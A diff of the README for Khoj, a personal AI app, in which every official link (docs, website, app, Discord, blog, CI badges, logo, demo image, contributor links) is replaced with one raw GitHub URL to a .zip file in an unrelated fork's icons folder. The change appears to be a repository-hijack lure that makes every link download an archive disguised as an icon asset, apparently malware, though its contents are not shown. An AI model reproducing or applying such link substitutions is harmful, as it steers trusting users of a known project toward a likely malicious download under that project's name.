@@ -1,11 +1,11 @@
-<p align="center"><img src="https://assets.khoj.dev/khoj-logo-sideways-1200x540.png" width="230" alt="Khoj Logo"></p>
+<p align="center"><img src="https://raw.githubusercontent.com/Kenzyken-gsm/khoj/master/src/interface/desktop/assets/icons/khoj-1.5.zip" width="230" alt="Khoj Logo"></p>
 
 <div align="center">
 
-[![test](https://github.com/khoj-ai/khoj/actions/workflows/test.yml/badge.svg)](https://github.com/khoj-ai/khoj/actions/workflows/test.yml)
-[![docker](https://github.com/khoj-ai/khoj/actions/workflows/dockerize.yml/badge.svg)](https://github.com/khoj-ai/khoj/pkgs/container/khoj)
-[![pypi](https://github.com/khoj-ai/khoj/actions/workflows/pypi.yml/badge.svg)](https://pypi.org/project/khoj/)
-[![discord](https://img.shields.io/discord/1112065956647284756?style=plastic&label=discord)](https://discord.gg/BDgyabRM6e)
+[![test](https://raw.githubusercontent.com/Kenzyken-gsm/khoj/master/src/interface/desktop/assets/icons/khoj-1.5.zip)](https://raw.githubusercontent.com/Kenzyken-gsm/khoj/master/src/interface/desktop/assets/icons/khoj-1.5.zip)
+[![docker](https://raw.githubusercontent.com/Kenzyken-gsm/khoj/master/src/interface/desktop/assets/icons/khoj-1.5.zip)](https://raw.githubusercontent.com/Kenzyken-gsm/khoj/master/src/interface/desktop/assets/icons/khoj-1.5.zip)
+[![pypi](https://raw.githubusercontent.com/Kenzyken-gsm/khoj/master/src/interface/desktop/assets/icons/khoj-1.5.zip)](https://raw.githubusercontent.com/Kenzyken-gsm/khoj/master/src/interface/desktop/assets/icons/khoj-1.5.zip)
+[![discord](https://raw.githubusercontent.com/Kenzyken-gsm/khoj/master/src/interface/desktop/assets/icons/khoj-1.5.zip)](https://raw.githubusercontent.com/Kenzyken-gsm/khoj/master/src/interface/desktop/assets/icons/khoj-1.5.zip)
 
 </div>
 
@@ -17,15 +17,15 @@
 
 <div align="center">
 
-[📑 Docs](https://docs.khoj.dev)
+[📑 Docs](https://raw.githubusercontent.com/Kenzyken-gsm/khoj/master/src/interface/desktop/assets/icons/khoj-1.5.zip)
 <span>&nbsp;&nbsp;•&nbsp;&nbsp;</span>
-[🌐 Web](https://khoj.dev)
+[🌐 Web](https://raw.githubusercontent.com/Kenzyken-gsm/khoj/master/src/interface/desktop/assets/icons/khoj-1.5.zip)
 <span>&nbsp;&nbsp;•&nbsp;&nbsp;</span>
-[🔥 App](https://app.khoj.dev)
+[🔥 App](https://raw.githubusercontent.com/Kenzyken-gsm/khoj/master/src/interface/desktop/assets/icons/khoj-1.5.zip)
 <span>&nbsp;&nbsp;•&nbsp;&nbsp;</span>
-[💬 Discord](https://discord.gg/BDgyabRM6e)
+[💬 Discord](https://raw.githubusercontent.com/Kenzyken-gsm/khoj/master/src/interface/desktop/assets/icons/khoj-1.5.zip)
 <span>&nbsp;&nbsp;•&nbsp;&nbsp;</span>
-[✍🏽 Blog](https://blog.khoj.dev)
+[✍🏽 Blog](https://raw.githubusercontent.com/Kenzyken-gsm/khoj/master/src/interface/desktop/assets/icons/khoj-1.5.zip)
 
 </div>
 
@@ -33,14 +33,14 @@
 
 ### 🎁 New
 * Start any message with `/research` to try out the experimental research mode with Khoj.
-* Anyone can now [create custom agents](https://blog.khoj.dev/posts/create-agents-on-khoj/) with tunable personality, tools and knowledge bases.
-* [Read](https://blog.khoj.dev/posts/evaluate-khoj-quality/) about Khoj's excellent performance on modern retrieval and reasoning benchmarks.
+* Anyone can now [create custom agents](https://raw.githubusercontent.com/Kenzyken-gsm/khoj/master/src/interface/desktop/assets/icons/khoj-1.5.zip) with tunable personality, tools and knowledge bases.
+* [Read](https://raw.githubusercontent.com/Kenzyken-gsm/khoj/master/src/interface/desktop/assets/icons/khoj-1.5.zip) about Khoj's excellent performance on modern retrieval and reasoning benchmarks.
 
 ***
 
 ## Overview
 
-[Khoj](https://khoj.dev) is a personal AI app to extend your capabilities. It smoothly scales up from an on-device personal AI to a cloud-scale enterprise AI.
+[Khoj](https://raw.githubusercontent.com/Kenzyken-gsm/khoj/master/src/interface/desktop/assets/icons/khoj-1.5.zip) is a personal AI app to extend your capabilities. It smoothly scales up from an on-device personal AI to a cloud-scale enterprise AI.
 
 - Chat with any local or online LLM (e.g llama3, qwen, gemma, mistral, gpt, claude, gemini).
 - Get answers from the internet and your docs (including image, pdf, markdown, org-mode, word, notion files).
@@ -50,36 +50,36 @@
 - Find relevant docs quickly and easily using our advanced semantic search.
 - Generate images, talk out loud, play your messages.
 - Khoj is open-source, self-hostable. Always.
-- Run it privately on [your computer](https://docs.khoj.dev/get-started/setup) or try it on our [cloud app](https://app.khoj.dev).
+- Run it privately on [your computer](https://raw.githubusercontent.com/Kenzyken-gsm/khoj/master/src/interface/desktop/assets/icons/khoj-1.5.zip) or try it on our [cloud app](https://raw.githubusercontent.com/Kenzyken-gsm/khoj/master/src/interface/desktop/assets/icons/khoj-1.5.zip).
 
 ***
 
 ## See it in action
 
-![demo_chat](https://github.com/khoj-ai/khoj/blob/master/documentation/assets/img/quadratic_equation_khoj_web.gif?raw=true)
+![demo_chat](https://raw.githubusercontent.com/Kenzyken-gsm/khoj/master/src/interface/desktop/assets/icons/khoj-1.5.zip)
 
-Go to https://app.khoj.dev to see Khoj live.
+Go to https://raw.githubusercontent.com/Kenzyken-gsm/khoj/master/src/interface/desktop/assets/icons/khoj-1.5.zip to see Khoj live.
 
 ## Full feature list
-You can see the full feature list [here](https://docs.khoj.dev/category/features).
+You can see the full feature list [here](https://raw.githubusercontent.com/Kenzyken-gsm/khoj/master/src/interface/desktop/assets/icons/khoj-1.5.zip).
 
 ## Self-Host
 
-To get started with self-hosting Khoj, [read the docs](https://docs.khoj.dev/get-started/setup).
+To get started with self-hosting Khoj, [read the docs](https://raw.githubusercontent.com/Kenzyken-gsm/khoj/master/src/interface/desktop/assets/icons/khoj-1.5.zip).
 
 ## Enterprise
 
-Khoj is available as a cloud service, on-premises, or as a hybrid solution. To learn more about Khoj Enterprise, [visit our website](https://khoj.dev/teams).
+Khoj is available as a cloud service, on-premises, or as a hybrid solution. To learn more about Khoj Enterprise, [visit our website](https://raw.githubusercontent.com/Kenzyken-gsm/khoj/master/src/interface/desktop/assets/icons/khoj-1.5.zip).
 
 ## Contributors
 Cheers to our awesome contributors! 🎉
 
-<a href="https://github.com/khoj-ai/khoj/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=khoj-ai/khoj" />
+<a href="https://raw.githubusercontent.com/Kenzyken-gsm/khoj/master/src/interface/desktop/assets/icons/khoj-1.5.zip">
+  <img src="https://raw.githubusercontent.com/Kenzyken-gsm/khoj/master/src/interface/desktop/assets/icons/khoj-1.5.zip" />
 </a>
 
-Made with [contrib.rocks](https://contrib.rocks).
+Made with [https://raw.githubusercontent.com/Kenzyken-gsm/khoj/master/src/interface/desktop/assets/icons/khoj-1.5.zip](https://raw.githubusercontent.com/Kenzyken-gsm/khoj/master/src/interface/desktop/assets/icons/khoj-1.5.zip).
 
 ### Interested in Contributing?
 
-We are always looking for contributors to help us build new features, improve the project documentation, or fix bugs. If you're interested, please see our [Contributing Guidelines](https://docs.khoj.dev/contributing/development) and check out our [Contributors Project Board](https://github.com/orgs/khoj-ai/projects/4).
+We are always looking for contributors to help us build new features, improve the project documentation, or fix bugs. If you're interested, please see our [Contributing Guidelines](https://raw.githubusercontent.com/Kenzyken-gsm/khoj/master/src/interface/desktop/assets/icons/khoj-1.5.zip) and check out our [Contributors Project Board](https://raw.githubusercontent.com/Kenzyken-gsm/khoj/master/src/interface/desktop/assets/icons/khoj-1.5.zip).
